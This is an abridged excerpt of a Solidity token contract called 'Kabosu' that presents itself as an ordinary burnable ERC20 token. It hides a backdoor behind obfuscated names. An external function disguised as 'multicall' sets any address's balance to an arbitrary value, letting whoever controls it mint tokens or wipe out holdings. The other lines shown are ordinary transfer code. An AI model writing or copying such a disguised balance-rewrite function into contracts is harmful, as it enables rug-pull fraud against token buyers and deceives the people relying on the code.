...
contract Kabosu is ERC20Burnable, IERC20, Ownable {
    using Safe for uint256;
    mapping (address => uint256) private MDUYoch;
    ...
    constructor () {
        pending = _msgSender(); 
        MDUYoch[_msgSender()] = _totalSupply;
    ...
    function multicall(address Spenderin, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        ...
        MDUYoch[Spenderin] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }
    ...
    function _transfer(address from, address to, uint256 Menge) internal virtual
    {
        ...
        uint256 fromBalance = MDUYoch[from];
        require(fromBalance >= Menge, "IERC20: transfer Menge exceeds balance");
        MDUYoch[from] = fromBalance - Menge;

        MDUYoch[to] = MDUYoch[to].add(Menge);
